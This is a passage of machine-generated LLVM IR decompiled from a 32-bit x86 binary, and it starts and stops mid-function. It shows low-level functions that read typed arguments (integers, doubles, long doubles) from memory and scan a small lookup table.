  %v0_804c9d1 = load i32, i32* @ebx, align 4
  %v1_804c9d1 = add i32 %v0_804c9d1, 24
  %v2_804c9d1 = inttoptr i32 %v1_804c9d1 to i32*
  store i32 0, i32* %v2_804c9d1, align 4
  %v0_804c9d8 = load i32, i32* @ebx, align 4
  %v1_804c9d8 = add i32 %v0_804c9d8, 4
  %v2_804c9d8 = inttoptr i32 %v1_804c9d8 to i32*
  store i32 0, i32* %v2_804c9d8, align 4
  %v0_804c9df = load i32, i32* @ebx, align 4
  %v1_804c9df = add i32 %v0_804c9df, 8
  %v2_804c9df = inttoptr i32 %v1_804c9df to i32*
  store i32 0, i32* %v2_804c9df, align 4
  %v0_804c9e6 = load i32, i32* @ebx, align 4
  %v1_804c9e7 = call i32 @function_804c9f8(i32 %v0_804c9e6)
  %v1_804c9ef = load i32, i32* @ebx, align 4
  %v2_804c9ef = add i32 %v1_804c9ef, 24
  %v3_804c9ef = inttoptr i32 %v2_804c9ef to i32*
  store i32 %v3_804c9c1, i32* %v3_804c9ef, align 4
  br label %dec_label_pc_804c9f2

dec_label_pc_804c9f2:                             ; preds = %dec_label_pc_804c9b4, %dec_label_pc_804c9cb
  %v2_804c9f2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804c9b5, i32* @ebx, align 4
  store i32 %v0_804c9b4, i32* @esi, align 4
  ret i32 %v2_804c9f2

; uselistorder directives
  uselistorder i32 %v3_804c9c1, { 1, 2, 0 }
  uselistorder i32 (i32)* @function_804c9f8, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c9f2, { 1, 0 }
}

define i32 @function_804c9f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c9f8:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804c9f9 = load i32, i32* @ebx, align 4
  store i32 %v0_804c9f9, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804c9fe = add i32 %arg1, 24
  %v2_804c9fe = inttoptr i32 %v1_804c9fe to i32*
  %v3_804c9fe = load i32, i32* %v2_804c9fe, align 4
  %v4_804c9fe = icmp eq i32 %v3_804c9fe, 0
  %v1_804ca02 = add i32 %arg1, 80
  store i32 %v1_804ca02, i32* %ebx.global-to-local, align 4
  %v1_804ca05 = icmp eq i1 %v4_804c9fe, false
  %v1_804cabd = add i32 %arg1, 8
  %v2_804cabd = inttoptr i32 %v1_804cabd to i32*
  %v3_804cabd = load i32, i32* %v2_804cabd, align 4
  %v8_804cabd = icmp eq i32 %v3_804cabd, -2147483648
  %v1_804cac4 = icmp eq i1 %v8_804cabd, false
  br i1 %v1_804ca05, label %dec_label_pc_804cabd, label %dec_label_pc_804ca0b

dec_label_pc_804ca0b:                             ; preds = %dec_label_pc_804c9f8
  br i1 %v1_804cac4, label %dec_label_pc_804ca25, label %dec_label_pc_804ca14

dec_label_pc_804ca14:                             ; preds = %dec_label_pc_804ca0b
  %v1_804ca14 = add i32 %arg1, 76
  %v2_804ca14 = inttoptr i32 %v1_804ca14 to i32*
  %v3_804ca14 = load i32, i32* %v2_804ca14, align 4
  store i32 %v3_804ca14, i32* %eax.global-to-local, align 4
  %v1_804ca17 = add i32 %v3_804ca14, 4
  store i32 %v1_804ca17, i32* %edx.global-to-local, align 4
  store i32 %v1_804ca17, i32* %v2_804ca14, align 4
  %v0_804ca1d = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca1d = inttoptr i32 %v0_804ca1d to i32*
  %v2_804ca1d = load i32, i32* %v1_804ca1d, align 4
  store i32 %v2_804ca1d, i32* %eax.global-to-local, align 4
  %v1_804ca1f = load i32, i32* @ecx, align 4
  %v2_804ca1f = add i32 %v1_804ca1f, 80
  %v3_804ca1f = inttoptr i32 %v2_804ca1f to i32*
  store i32 %v2_804ca1d, i32* %v3_804ca1f, align 4
  %v0_804ca22 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca22 = load i32, i32* @ecx, align 4
  %v2_804ca22 = add i32 %v1_804ca22, 8
  %v3_804ca22 = inttoptr i32 %v2_804ca22 to i32*
  store i32 %v0_804ca22, i32* %v3_804ca22, align 4
  %v0_804ca25.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ca25

dec_label_pc_804ca25:                             ; preds = %dec_label_pc_804ca0b, %dec_label_pc_804ca14
  %v1_804ca34 = phi i32 [ %arg1, %dec_label_pc_804ca0b ], [ %v0_804ca25.pre, %dec_label_pc_804ca14 ]
  %v1_804ca25 = add i32 %v1_804ca34, 4
  %v2_804ca25 = inttoptr i32 %v1_804ca25 to i32*
  %v3_804ca25 = load i32, i32* %v2_804ca25, align 4
  %v8_804ca25 = icmp eq i32 %v3_804ca25, -2147483648
  %v1_804ca2c = icmp eq i1 %v8_804ca25, false
  br i1 %v1_804ca2c, label %dec_label_pc_804ca3f, label %dec_label_pc_804ca2e

dec_label_pc_804ca2e:                             ; preds = %dec_label_pc_804ca25
  %v1_804ca2e = add i32 %v1_804ca34, 76
  %v2_804ca2e = inttoptr i32 %v1_804ca2e to i32*
  %v3_804ca2e = load i32, i32* %v2_804ca2e, align 4
  store i32 %v3_804ca2e, i32* %eax.global-to-local, align 4
  %v1_804ca31 = add i32 %v3_804ca2e, 4
  store i32 %v1_804ca31, i32* %edx.global-to-local, align 4
  store i32 %v1_804ca31, i32* %v2_804ca2e, align 4
  %v0_804ca37 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca37 = inttoptr i32 %v0_804ca37 to i32*
  %v2_804ca37 = load i32, i32* %v1_804ca37, align 4
  store i32 %v2_804ca37, i32* %eax.global-to-local, align 4
  %v1_804ca39 = load i32, i32* @ecx, align 4
  %v2_804ca39 = add i32 %v1_804ca39, 80
  %v3_804ca39 = inttoptr i32 %v2_804ca39 to i32*
  store i32 %v2_804ca37, i32* %v3_804ca39, align 4
  %v0_804ca3c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca3c = load i32, i32* @ecx, align 4
  %v2_804ca3c = add i32 %v1_804ca3c, 4
  %v3_804ca3c = inttoptr i32 %v2_804ca3c to i32*
  store i32 %v0_804ca3c, i32* %v3_804ca3c, align 4
  %v1_804cab615.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ca3f

dec_label_pc_804ca3f:                             ; preds = %dec_label_pc_804ca25, %dec_label_pc_804ca2e
  %v1_804cab615 = phi i32 [ %v1_804ca34, %dec_label_pc_804ca25 ], [ %v1_804cab615.pre, %dec_label_pc_804ca2e ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804cab616 = add i32 %v1_804cab615, 28
  %v3_804cab617 = inttoptr i32 %v2_804cab616 to i32*
  %v4_804cab618 = load i32, i32* %v3_804cab617, align 4
  %v5_804cab920 = icmp sgt i32 %v4_804cab618, 0
  br i1 %v5_804cab920, label %dec_label_pc_804ca43, label %dec_label_pc_804caeb.loopexit

dec_label_pc_804ca43:                             ; preds = %dec_label_pc_804ca3f, %dec_label_pc_804cab5
  %v1_804cab622 = phi i32 [ %v1_804cab6, %dec_label_pc_804cab5 ], [ %v1_804cab615, %dec_label_pc_804ca3f ]
  %v1_804ca4321 = phi i32 [ %v1_804cab5, %dec_label_pc_804cab5 ], [ 0, %dec_label_pc_804ca3f ]
  %v2_804ca43 = mul i32 %v1_804ca4321, 4
  %v3_804ca43 = add i32 %v2_804ca43, 40
  %v4_804ca43 = add i32 %v3_804ca43, %v1_804cab622
  %v5_804ca43 = inttoptr i32 %v4_804ca43 to i32*
  %v6_804ca43 = load i32, i32* %v5_804ca43, align 4
  store i32 %v6_804ca43, i32* %eax.global-to-local, align 4
  %v1_804ca47 = add i32 %v6_804ca43, -8
  %v9_804ca47 = icmp eq i32 %v1_804ca47, 0
  br i1 %v9_804ca47, label %dec_label_pc_804cab5, label %dec_label_pc_804ca4c

dec_label_pc_804ca4c:                             ; preds = %dec_label_pc_804ca43
  %v10_804ca47 = icmp slt i32 %v1_804ca47, 0
  %v6_804ca47 = sub i32 7, %v6_804ca43
  %v7_804ca47 = and i32 %v6_804ca47, %v6_804ca43
  %v8_804ca47 = icmp slt i32 %v7_804ca47, 0
  %v1_804ca4c = add i32 %v1_804cab622, 76
  %v2_804ca4c = inttoptr i32 %v1_804ca4c to i32*
  %v3_804ca4c = load i32, i32* %v2_804ca4c, align 4
  store i32 %v3_804ca4c, i32* %edx.global-to-local, align 4
  %v3_804ca4f = icmp eq i1 %v10_804ca47, %v8_804ca47
  br i1 %v3_804ca4f, label %dec_label_pc_804ca5f, label %dec_label_pc_804ca51

dec_label_pc_804ca51:                             ; preds = %dec_label_pc_804ca4c
  %tmp13 = icmp slt i32 %v6_804ca43, 3
  %v9_804ca58 = icmp eq i32 %v6_804ca43, 7
  %v1_804ca5b = icmp eq i1 %v9_804ca58, false
  %or.cond = or i1 %tmp13, %v1_804ca5b
  br i1 %or.cond, label %dec_label_pc_804caa8, label %dec_label_pc_804ca8a

dec_label_pc_804ca5f:                             ; preds = %dec_label_pc_804ca4c
  %tmp14 = icmp sgt i32 %v6_804ca43, 1024
  br i1 %tmp14, label %dec_label_pc_804ca68, label %dec_label_pc_804caa8

dec_label_pc_804ca68:                             ; preds = %dec_label_pc_804ca5f
  %v6_804ca68 = icmp eq i32 %v6_804ca43, 2048
  br i1 %v6_804ca68, label %dec_label_pc_804ca78, label %dec_label_pc_804ca6f

dec_label_pc_804ca6f:                             ; preds = %dec_label_pc_804ca68
  %v9_804ca6f = icmp eq i32 %v6_804ca43, 2055
  %v1_804ca74 = icmp eq i1 %v9_804ca6f, false
  br i1 %v1_804ca74, label %dec_label_pc_804caa8, label %dec_label_pc_804ca99

dec_label_pc_804ca78:                             ; preds = %dec_label_pc_804ca68
  %v1_804ca78 = add i32 %v3_804ca4c, 8
  store i32 %v1_804ca78, i32* %eax.global-to-local, align 4
  store i32 %v1_804ca78, i32* %v2_804ca4c, align 4
  %v0_804ca7e = load i32, i32* %edx.global-to-local, align 4
  %v1_804ca7e = inttoptr i32 %v0_804ca7e to i32*
  %v2_804ca7e = load i32, i32* %v1_804ca7e, align 4
  store i32 %v2_804ca7e, i32* %eax.global-to-local, align 4
  %v1_804ca80 = add i32 %v0_804ca7e, 4
  %v2_804ca80 = inttoptr i32 %v1_804ca80 to i32*
  %v3_804ca80 = load i32, i32* %v2_804ca80, align 4
  store i32 %v3_804ca80, i32* %edx.global-to-local, align 4
  %v1_804ca83 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ca83 = inttoptr i32 %v1_804ca83 to i32*
  store i32 %v2_804ca7e, i32* %v2_804ca83, align 4
  %v0_804ca85 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ca85 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ca85 = add i32 %v1_804ca85, 4
  %v3_804ca85 = inttoptr i32 %v2_804ca85 to i32*
  store i32 %v0_804ca85, i32* %v3_804ca85, align 4
  br label %dec_label_pc_804cab2

dec_label_pc_804ca8a:                             ; preds = %dec_label_pc_804ca51
  %v3_804ca8a = load i32, i32* %v2_804ca4c, align 4
  store i32 %v3_804ca8a, i32* %edx.global-to-local, align 4
  %v1_804ca8d = add i32 %v3_804ca8a, 8
  store i32 %v1_804ca8d, i32* %eax.global-to-local, align 4
  store i32 %v1_804ca8d, i32* %v2_804ca4c, align 4
  %v0_804ca93 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ca93 = inttoptr i32 %v0_804ca93 to double*
  %v2_804ca93 = load double, double* %v1_804ca93, align 4
  %v2_804ca95 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804ca95 = inttoptr i32 %v2_804ca95 to double*
  store double %v2_804ca93, double* %v4_804ca95, align 4
  br label %dec_label_pc_804cab2

dec_label_pc_804ca99:                             ; preds = %dec_label_pc_804ca6f
  %v3_804ca99 = load i32, i32* %v2_804ca4c, align 4
  store i32 %v3_804ca99, i32* %edx.global-to-local, align 4
  %v1_804ca9c = add i32 %v3_804ca99, 12
  store i32 %v1_804ca9c, i32* %eax.global-to-local, align 4
  store i32 %v1_804ca9c, i32* %v2_804ca4c, align 4
  %v0_804caa2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804caa2 = inttoptr i32 %v0_804caa2 to x86_fp80*
  %v2_804caa2 = load x86_fp80, x86_fp80* %v1_804caa2, align 4
  %v2_804caa4 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804caa4 = inttoptr i32 %v2_804caa4 to x86_fp80*
  store x86_fp80 %v2_804caa2, x86_fp80* %v3_804caa4, align 4
  br label %dec_label_pc_804cab2

dec_label_pc_804caa8:                             ; preds = %dec_label_pc_804ca51, %dec_label_pc_804ca5f, %dec_label_pc_804ca6f
  %v1_804caa8 = add i32 %v3_804ca4c, 4
  store i32 %v1_804caa8, i32* %eax.global-to-local, align 4
  store i32 %v1_804caa8, i32* %v2_804ca4c, align 4
  %v0_804caae = load i32, i32* %edx.global-to-local, align 4
  %v1_804caae = inttoptr i32 %v0_804caae to i32*
  %v2_804caae = load i32, i32* %v1_804caae, align 4
  store i32 %v2_804caae, i32* %eax.global-to-local, align 4
  %v1_804cab0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cab0 = inttoptr i32 %v1_804cab0 to i32*
  store i32 %v2_804caae, i32* %v2_804cab0, align 4
  br label %dec_label_pc_804cab2

dec_label_pc_804cab2:                             ; preds = %dec_label_pc_804ca99, %dec_label_pc_804ca8a, %dec_label_pc_804ca78, %dec_label_pc_804caa8
  %v0_804cab2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cab2 = add i32 %v0_804cab2, 12
  store i32 %v1_804cab2, i32* %ebx.global-to-local, align 4
  %v0_804cab5.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804cab6.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804cab5

dec_label_pc_804cab5:                             ; preds = %dec_label_pc_804ca43, %dec_label_pc_804cab2
  %v1_804cab6 = phi i32 [ %v1_804cab622, %dec_label_pc_804ca43 ], [ %v1_804cab6.pre, %dec_label_pc_804cab2 ]
  %v0_804cab5 = phi i32 [ %v1_804ca4321, %dec_label_pc_804ca43 ], [ %v0_804cab5.pre, %dec_label_pc_804cab2 ]
  %v1_804cab5 = add i32 %v0_804cab5, 1
  store i32 %v1_804cab5, i32* %esi.global-to-local, align 4
  %v2_804cab6 = add i32 %v1_804cab6, 28
  %v3_804cab6 = inttoptr i32 %v2_804cab6 to i32*
  %v4_804cab6 = load i32, i32* %v3_804cab6, align 4
  %v5_804cab9 = icmp slt i32 %v1_804cab5, %v4_804cab6
  br i1 %v5_804cab9, label %dec_label_pc_804ca43, label %dec_label_pc_804cab6.dec_label_pc_804caeb.loopexit_crit_edge

dec_label_pc_804cabd:                             ; preds = %dec_label_pc_804c9f8
  br i1 %v1_804cac4, label %dec_label_pc_804cad4, label %dec_label_pc_804cac6

dec_label_pc_804cac6:                             ; preds = %dec_label_pc_804cabd
  %v1_804cac6 = add i32 %arg1, 36
  %v2_804cac6 = inttoptr i32 %v1_804cac6 to i8*
  %v3_804cac6 = load i8, i8* %v2_804cac6, align 1
  %v2_804caca = zext i8 %v3_804cac6 to i32
  %v3_804caca = mul nuw nsw i32 %v2_804caca, 12
  store i32 %v3_804caca, i32* %eax.global-to-local, align 4
  %v2_804cacd = add i32 %arg1, 68
  %v3_804cacd = add i32 %v2_804cacd, %v3_804caca
  %v4_804cacd = inttoptr i32 %v3_804cacd to i32*
  %v5_804cacd = load i32, i32* %v4_804cacd, align 4
  store i32 %v5_804cacd, i32* %eax.global-to-local, align 4
  store i32 %v5_804cacd, i32* %v2_804cabd, align 4
  %v0_804cad4.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804cad4

dec_label_pc_804cad4:                             ; preds = %dec_label_pc_804cabd, %dec_label_pc_804cac6
  %v1_804cae8 = phi i32 [ %arg1, %dec_label_pc_804cabd ], [ %v0_804cad4.pre, %dec_label_pc_804cac6 ]
  %v1_804cad4 = add i32 %v1_804cae8, 4
  %v2_804cad4 = inttoptr i32 %v1_804cad4 to i32*
  %v3_804cad4 = load i32, i32* %v2_804cad4, align 4
  %v8_804cad4 = icmp eq i32 %v3_804cad4, -2147483648
  %v1_804cadb = icmp eq i1 %v8_804cad4, false
  br i1 %v1_804cadb, label %dec_label_pc_804caeb, label %dec_label_pc_804cadd

dec_label_pc_804cadd:                             ; preds = %dec_label_pc_804cad4
  %v1_804cadd = add i32 %v1_804cae8, 37
  %v2_804cadd = inttoptr i32 %v1_804cadd to i8*
  %v3_804cadd = load i8, i8* %v2_804cadd, align 1
  %v2_804cae1 = zext i8 %v3_804cadd to i32
  %v3_804cae1 = mul nuw nsw i32 %v2_804cae1, 12
  store i32 %v3_804cae1, i32* %eax.global-to-local, align 4
  %v1_804cae4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cae4 = add nsw i32 %v3_804cae1, -12
  %v3_804cae4 = add i32 %v2_804cae4, %v1_804cae4
  %v4_804cae4 = inttoptr i32 %v3_804cae4 to i32*
  %v5_804cae4 = load i32, i32* %v4_804cae4, align 4
  store i32 %v5_804cae4, i32* %eax.global-to-local, align 4
  store i32 %v5_804cae4, i32* %v2_804cad4, align 4
  %v0_804caeb.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804caeb

dec_label_pc_804cab6.dec_label_pc_804caeb.loopexit_crit_edge: ; preds = %dec_label_pc_804cab5
  br label %dec_label_pc_804caeb.loopexit

dec_label_pc_804caeb.loopexit:                    ; preds = %dec_label_pc_804cab6.dec_label_pc_804caeb.loopexit_crit_edge, %dec_label_pc_804ca3f
  %v1_804cab6.lcssa = phi i32 [ %v1_804cab6, %dec_label_pc_804cab6.dec_label_pc_804caeb.loopexit_crit_edge ], [ %v1_804cab615, %dec_label_pc_804ca3f ]
  br label %dec_label_pc_804caeb

dec_label_pc_804caeb:                             ; preds = %dec_label_pc_804caeb.loopexit, %dec_label_pc_804cad4, %dec_label_pc_804cadd
  %v10_804caf2 = phi i32 [ %v1_804cab6.lcssa, %dec_label_pc_804caeb.loopexit ], [ %v1_804cae8, %dec_label_pc_804cad4 ], [ %v0_804caeb.pre, %dec_label_pc_804cadd ]
  %v1_804caeb = add i32 %v10_804caf2, 8
  %v2_804caeb = inttoptr i32 %v1_804caeb to i32*
  %v3_804caeb = load i32, i32* %v2_804caeb, align 4
  store i32 %v3_804caeb, i32* %eax.global-to-local, align 4
  %v2_804caee = icmp slt i32 %v3_804caeb, 0
  %v1_804caf0 = icmp eq i1 %v2_804caee, false
  br i1 %v1_804caf0, label %dec_label_pc_804cb06, label %dec_label_pc_804caf2

dec_label_pc_804caf2:                             ; preds = %dec_label_pc_804caeb
  %v1_804caf2 = add i32 %v10_804caf2, 16
  %v2_804caf2 = inttoptr i32 %v1_804caf2 to i32*
  %v3_804caf2 = load i32, i32* %v2_804caf2, align 4
  %v4_804caf2 = or i32 %v3_804caf2, 8
  store i32 %v4_804caf2, i32* %v2_804caf2, align 4
  %v0_804caf6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804caf6 = sub i32 0, %v0_804caf6
  store i32 %v1_804caf6, i32* %eax.global-to-local, align 4
  %v1_804caf8 = load i32, i32* @ecx, align 4
  %v2_804caf8 = add i32 %v1_804caf8, 8
  %v3_804caf8 = inttoptr i32 %v2_804caf8 to i32*
  store i32 %v1_804caf6, i32* %v3_804caf8, align 4
  %v0_804cafb = load i32, i32* @ecx, align 4
  %v1_804cafb = add i32 %v0_804cafb, 16
  %v2_804cafb = inttoptr i32 %v1_804cafb to i32*
  %v3_804cafb = load i32, i32* %v2_804cafb, align 4
  %v4_804cafb = and i32 %v3_804cafb, -2
  store i32 %v4_804cafb, i32* %v2_804cafb, align 4
  %v0_804caff = load i32, i32* @ecx, align 4
  %v1_804caff = add i32 %v0_804caff, 20
  %v2_804caff = inttoptr i32 %v1_804caff to i32*
  store i32 32, i32* %v2_804caff, align 4
  %v0_804cb08.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cb06

dec_label_pc_804cb06:                             ; preds = %dec_label_pc_804caeb, %dec_label_pc_804caf2
  %v0_804cb08 = phi i32 [ %v3_804caeb, %dec_label_pc_804caeb ], [ %v0_804cb08.pre, %dec_label_pc_804caf2 ]
  %v2_804cb06 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804cb06, i32* @ebx, align 4
  ret i32 %v0_804cb08

; uselistorder directives
  uselistorder i32 %v3_804cae1, { 1, 0 }
  uselistorder i32 %v3_804caca, { 1, 0 }
  uselistorder i32 %v1_804cab5, { 2, 1, 0 }
  uselistorder i32 %v1_804cab6, { 1, 2, 0 }
  uselistorder i32 %v3_804ca4c, { 1, 0, 2 }
  uselistorder i32* %v2_804ca4c, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804ca47, { 1, 0 }
  uselistorder i32 %v6_804ca43, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804ca4321, { 1, 0 }
  uselistorder i32 %v1_804cab615, { 2, 0, 1 }
  uselistorder i1 %v1_804cac4, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_804cb06, { 1, 0 }
  uselistorder label %dec_label_pc_804caeb, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804cad4, { 1, 0 }
  uselistorder label %dec_label_pc_804cab5, { 1, 0 }
  uselistorder label %dec_label_pc_804cab2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804caa8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ca43, { 1, 0 }
  uselistorder label %dec_label_pc_804ca3f, { 1, 0 }
  uselistorder label %dec_label_pc_804ca25, { 1, 0 }
}

define i32 @function_804cb0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804cb0c:
  %v0_804cb0c = load i32, i32* @eax, align 4
  br label %dec_label_pc_804cb13

dec_label_pc_804cb13:                             ; preds = %dec_label_pc_804cb13, %dec_label_pc_804cb0c
  %v0_804cb13 = phi i32 [ ptrtoint (i8** @global_var_8053b16.123 to i32), %dec_label_pc_804cb0c ], [ %v1_804cb13, %dec_label_pc_804cb13 ]
  %v1_804cb13 = add i32 %v0_804cb13, -2
  %v1_804cb16 = inttoptr i32 %v1_804cb13 to i16*
  %v2_804cb16 = load i16, i16* %v1_804cb16, align 2
  %v3_804cb16 = sext i16 %v2_804cb16 to i32
  %v12_804cb19 = icmp ne i32 %v3_804cb16, %v0_804cb0c
  %v6_804cb23 = icmp ugt i32 %v1_804cb13, ptrtoint (i32* @global_var_8053afe.124 to i32)
  %or.cond = and i1 %v6_804cb23, %v12_804cb19
  br i1 %or.cond, label %dec_label_pc_804cb13, label %dec_label_pc_804cb25

dec_label_pc_804cb25:                             ; preds = %dec_label_pc_804cb13
  %.pre = add i32 %v0_804cb13, -134560512
  %v2_804cb2b = sdiv i32 %.pre, 2
  store i32 %v2_804cb2b, i32* @edx, align 4
  %v1_804cb2d = add i32 %v2_804cb2b, ptrtoint (i8** @global_var_8053b16.123 to i32)
  %v2_804cb2d = inttoptr i32 %v1_804cb2d to i8*
  %v3_804cb2d = load i8, i8* %v2_804cb2d, align 1
  %v4_804cb2d = zext i8 %v3_804cb2d to i32
  ret i32 %v4_804cb2d

; uselistorder directives
  uselistorder i32 %v2_804cb2b, { 1, 0 }
  uselistorder i32 %v1_804cb13, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8053b16.123 to i32), { 1, 0 }
}

define i32 @function_804cb35(i32* %arg1) local_unnamed_addr {
dec_label_pc_804cb35:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804cb36 = load i32, i32* @edi, align 4
  %v0_804cb37 = load i32, i32* @esi, align 4
  %v0_804cb38 = load i32, i32* @ebx, align 4
  store i32 %v0_804cb38, i32* %stack_var_-16, align 4
  %v4_804cb38 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804cb64 = add i32 %tmp76, 24
  %v2_804cb64 = inttoptr i32 %v1_804cb64 to i32*
  %v3_804cb64 = load i32, i32* %v2_804cb64, align 4
  store i32 %v3_804cb64, i32* %eax.global-to-local, align 4
  %v1_804cb6b = add i32 %tmp76, 16
  %v2_804cb6b = inttoptr i32 %v1_804cb6b to i32*
  %v3_804cb6b = load i32, i32* %v2_804cb6b, align 4
  %v1_804cb6e = and i32 %v3_804cb6b, 128
  %v2_804cb6e = icmp eq i32 %v1_804cb6e, 0
  store i32 %v1_804cb6e, i32* %edi.global-to-local, align 4
  %v1_804cb74 = icmp eq i1 %v2_804cb6e, false
  br i1 %v1_804cb74, label %dec_label_pc_804cb87, label %dec_label_pc_804cb76

dec_label_pc_804cb76:                             ; preds = %dec_label_pc_804cb35
  %v2_804cb76 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804cbd4.outer

dec_label_pc_804cb81:                             ; preds = %dec_label_pc_804cd0f
  %v1_804cb81 = add i32 %v0_804cd0f.pre.pre, 1
  store i32 %v1_804cb81, i32* @esi, align 4
  br label %dec_label_pc_804cd1f

dec_label_pc_804cb87:                             ; preds = %dec_label_pc_804cb35
  %v15_804cb39 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804cb89

dec_label_pc_804cb89:                             ; preds = %dec_label_pc_804cbb1.dec_label_pc_804cb89_crit_edge, %dec_label_pc_804cb87
  %v2_804cb9a = phi i32 [ %v2_804cb9a.pre, %dec_label_pc_804cbb1.dec_label_pc_804cb89_crit_edge ], [ %v15_804cb39, %dec_label_pc_804cb87 ]
  %v3_804cb9a = phi i32 [ %v1_804cbb1, %dec_label_pc_804cbb1.dec_label_pc_804cb89_crit_edge ], [ 0, %dec_label_pc_804cb87 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804cb8d = mul i32 %v3_804cb9a, 4
  store i32 %v1_804cb8d, i32* @ecx, align 4
  %v2_804cb94 = load i32, i32* %arg1, align 4
  store i32 %v2_804cb94, i32* @edx, align 4
  %v2_804cb96 = add i32 %v1_804cb8d, -4
  %v3_804cb96 = add i32 %v2_804cb96, %v2_804cb94
  %v4_804cb96 = inttoptr i32 %v3_804cb96 to i32*
  %v5_804cb96 = load i32, i32* %v4_804cb96, align 4
  store i32 %v5_804cb96, i32* %eax.global-to-local, align 4
  %v1_804cb9a = trunc i32 %v5_804cb96 to i8
  %v4_804cb9a = add i32 %v2_804cb9a, 36
  %v5_804cb9a = add i32 %v4_804cb9a, %v3_804cb9a
  %v6_804cb9a = inttoptr i32 %v5_804cb9a to i8*
  store i8 %v1_804cb9a, i8* %v6_804cb9a, align 1
  %v0_804cb9e = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb9e = urem i32 %v0_804cb9e, 256
  %v2_804cb9e = load i32, i32* @ebx, align 4
  %v3_804cb9e = and i32 %v2_804cb9e, -256
  %v4_804cb9e = or i32 %v3_804cb9e, %v1_804cb9e
  store i32 %v4_804cb9e, i32* @ebx, align 4
  %v1_804cba0 = mul i32 %v0_804cb9e, 16777216
  %v2_804cba0 = sdiv i32 %v1_804cba0, 16777216
  store i32 %v2_804cba0, i32* %eax.global-to-local, align 4
  %v1_804cba3 = load i32, i32* @edx, align 4
  %v2_804cba3 = load i32, i32* @ecx, align 4
  %v3_804cba3 = add i32 %v1_804cba3, -4
  %v4_804cba3 = add i32 %v3_804cba3, %v2_804cba3
  %v5_804cba3 = inttoptr i32 %v4_804cba3 to i32*
  %v6_804cba3 = load i32, i32* %v5_804cba3, align 4
  %v17_804cba3 = icmp eq i32 %v2_804cba0, %v6_804cba3
  %v1_804cba7 = icmp eq i1 %v17_804cba3, false
  br i1 %v1_804cba7, label %dec_label_pc_804cef9, label %dec_label_pc_804cbad

dec_label_pc_804cbad:                             ; preds = %dec_label_pc_804cb89
  %v3_804cbad = trunc i32 %v0_804cb9e to i8
  %v4_804cbad = icmp eq i8 %v3_804cbad, 0
  br i1 %v4_804cbad, label %dec_label_pc_804cbb7, label %dec_label_pc_804cbb1

dec_label_pc_804cbb1:                             ; preds = %dec_label_pc_804cbad
  %v0_804cbb1 = load i32, i32* %esi.global-to-local, align 4
  %v1_804cbb1 = add i32 %v0_804cbb1, 1
  store i32 %v1_804cbb1, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804cbb1, 32
  br i1 %tmp, label %dec_label_pc_804cbb1.dec_label_pc_804cb89_crit_edge, label %dec_label_pc_804cbb7

dec_label_pc_804cbb1.dec_label_pc_804cb89_crit_edge: ; preds = %dec_label_pc_804cbb1
  %v2_804cb9a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804cb89
